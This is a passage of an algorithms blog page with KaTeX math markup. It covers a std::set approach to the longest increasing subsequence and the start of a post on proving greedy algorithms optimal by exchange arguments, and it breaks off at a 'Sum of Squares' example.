<p>for each element of <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span>. Additionally, we can observe that <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>i</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">lis</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span></span></span></span> is strictly increasing (that is, if we increase <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span></span></span></span>, the LIS can only stay the same or increase), meaning that the range of <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span></span></span></span> which satisfy the first condition is continuous, and so we simplify the recurrence to</p>

<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo><mo>&#x21a6;</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>A</mi><mo stretchy="false">[</mo><mi>n</mi><mo stretchy="false">]</mo><mo>&#x2264;</mo><mi>h</mi><mo>&lt;</mo><mi>m</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>otherwise</mtext></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">lis(h) \mapsto \begin{cases}
lis(h) + 1 &amp; A[n] \le h &lt; m \\
lis(h) &amp; \text{otherwise}
\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">↦</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="mopen">[</span><span class="mord mathnormal">n</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">m</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord">otherwise</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>

<p>where <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>&#x2208;</mo><mi mathvariant="double-struck">Z</mi><mo>&#x222a;</mo><mo stretchy="false">{</mo><mi mathvariant="normal">&#x221e;</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">m \in \mathbb{Z} \cup \{\infty\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&#x2208;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68889em;vertical-align:0em;"></span><span class="mord"><span class="mord mathbb">Z</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">&#x222a;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">&#x221e;</span><span class="mclose">}</span></span></span></span> is the lowest number such that <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo><mo>&gt;</mo><mi>l</mi><mi>i</mi><mi>s</mi><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">[</mo><mi>n</mi><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">lis(m) &gt; lis(A[n])</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mopen">[</span><span class="mord mathnormal">n</span><span class="mclose">]</span><span class="mclose">)</span></span></span></span>.</p>

<blockquote>
  <p>I’ll see if I can make a diagram demonstrating this</p>
</blockquote>

<p>Now, you can get an <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>log</mi><mo>&#x2061;</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n \log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> solution from here using a segment tree, but with a few more observations, we can further simplify things:</p>

<ol>
  <li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo><mo>&#x2212;</mo><mi>l</mi><mi>i</mi><mi>s</mi><mo stretchy="false">(</mo><mi>h</mi><mo>&#x2212;</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">lis(h) - lis(h-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">&#x2212;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">&#x2212;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span> is either 1 or 0 for all <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span></span></span></span>.</li>
  <li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo><mo mathvariant="normal">&#x2260;</mo><mi>l</mi><mi>i</mi><mi>s</mi><mo stretchy="false">(</mo><mi>h</mi><mo>&#x2212;</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">lis(h) \neq lis(h-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel">&#xe020;</span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">&#x2212;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span> only when <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo>&#x2208;</mo><mi>A</mi><mo stretchy="false">[</mo><mn>1..</mn><mi>n</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">h \in A[1..n]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&#x2208;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mopen">[</span><span class="mord">1</span><span class="mord">.</span><span class="mord">.</span><span class="mord mathnormal">n</span><span class="mclose">]</span></span></span></span>.</li>
</ol>

<p>Intuitively, (1) means that <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>i</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">lis</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span></span></span></span> can only step up one at a time (removing the last element from a increasing sequence will produce another increasing sequence) and (2) means that these steps only occur at values of <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span> (which is intuitively obvious once you think about it).</p>

<p>The key idea to creating the <code class="language-plaintext highlighter-rouge">std::set</code> solution is to <em>only</em> track these steps. Thus, finding <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span></span></span></span> becomes a <code class="language-plaintext highlighter-rouge">lower_bound</code> (line 4) and the range increment is equivalent to decreasing a value in the set (lines 5 and 6).</p>

<p>Getting the value of <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">lis(h)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mclose">)</span></span></span></span> is then the same as counting how many “steps” are below <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span></span></span></span> i.e. the number of elements in the set not greater than <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span></span></span></span>. Finding <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>i</mi><mi>s</mi><mo stretchy="false">(</mo><mi mathvariant="normal">&#x221e;</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">lis(\infty)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord">&#x221e;</span><span class="mclose">)</span></span></span></span>, which is done to get the final answer, simply means taking the size of the set, and querying any other value can be supported by using an <a href="https://en.wikipedia.org/wiki/Order_statistic_tree">order-statistic tree</a>.</p>

<h2 id="extensions-of-this-algorithm"><a href="#extensions-of-this-algorithm">Extensions of this algorithm</a></h2>

<p>You can use the basic ideas of this LIS algorithm to support:</p>

<ul>
  <li>Longest decreasing sequence, by sorting the set in reverse order with <code class="language-plaintext highlighter-rouge">std::set&lt;int, greater&lt;int&gt;&gt;</code></li>
  <li>Longest non-increasing/non-decreasing sequence, by using a multiset</li>
  <li>Run-length encoding as input, using a <code class="language-plaintext highlighter-rouge">std::map</code>.</li>
</ul>

<h2 id="practice-problems"><a href="#practice-problems">Practice Problems</a></h2>

<p>In order of difficulty:</p>

<ul>
  <li><a href="https://leetcode.com/problems/longest-increasing-subsequence">LeetCode - Longest Increasing Subsequence</a></li>
  <li><a href="https://orac.amt.edu.au/cgi-bin/train/problem.pl?set=aio08sen&amp;problemid=360">AIO2008 - Russian Dolls</a></li>
  <li><a href="http://kodu.ut.ee/~ahto/boi/2010/?item=boi.tasks.1">BOI2010 - PCB</a></li>
  <li><a href="https://codeforces.com/contest/1193/problem/B">Codeforces - Magic Tree</a></li>
</ul>
</div>
  

  <h2 class="fenced-y text-centre bleed"><a href="/posts/nearer-optimal-solution">Proving Algorithms using Nearer Optimal Solution</a></h2>
  
    <div class="bounded"><p>Greedy algorithms are a great solution to problems, but it’s usually harder to show they’re incorrect than to come up with them. Nearer Optimal Solution is one technique that can be used when the problem involves making a sequence of choices.</p>

<!--more-->

<p>This technique involves initially assuming the greedy is not optimal (i.e. there’s a better sequence of choices) and showing that it can always be made more like the greedy without being less optimal. Thus you can convert any “optimal” solution to the greedy, and so the greedy is optimal.</p>

<p>However, you need to be careful to ensure that you can indeed convert any optimal solution into the greedy.</p>

<p>In both of these examples, we’ll consider the first difference. While this isn’t necessary, it’s a common approach. There are also a variety of algorithms which can be proven using this technique, such as Kruskal’s MST.</p>

<h2 id="example-interval-maximal-independent-set"><a href="#example-interval-maximal-independent-set">Example: Interval Maximal Independent Set</a></h2>

<blockquote>
  <p>You’re given a set of intervals. Pick the largest number of intervals which don’t overlap.</p>
</blockquote>

<p>The greedy solution for this is to greedily take intervals with the earliest finishing time, ignoring ones which conflict with intervals we’ve already picked.</p>

<p>Let <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">G</span></span></span></span> be the intervals chosen by the greedy, and <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span> the chosen intervals in an optimal solution that’s different from the greedy i.e. <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo mathvariant="normal">&#x2260;</mo><mi>G</mi></mrow><annotation encoding="application/x-tex">S \neq G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel">&#xe020;</span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">G</span></span></span></span>. Since <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span> is optimal, it must have as least as many intervals as <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">G</span></span></span></span>. Consider the first different interval (ordered by finishing time) - <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">S_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">&#x200b;</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> and <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>G</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">G_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">&#x200b;</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>. Since the previous interval is the same, and <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>G</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">G_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">&#x200b;</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> finishes before <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">S_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">&#x200b;</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>, we can replace <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">S_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">&#x200b;</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> with <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>G</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">G_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">&#x200b;</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> to get a solution that’s closer to the greedy.</p>

<p>However, if <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">G</span></span></span></span> is a strict prefix of <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span>, we could’ve added the missing intervals to <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">G</span></span></span></span> and so <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">G</span></span></span></span> couldn’t have been produced by the greedy.</p>

<p>Since you can always repeat this procedure to get to <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">G</span></span></span></span>, the greedy algorithm is optimal.</p>

<h2 id="example-sum-of-squares"><a href="#example-sum-of-squares">Example: Sum of Squares<sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote">1</a></sup></a></h2>

<blockquote>
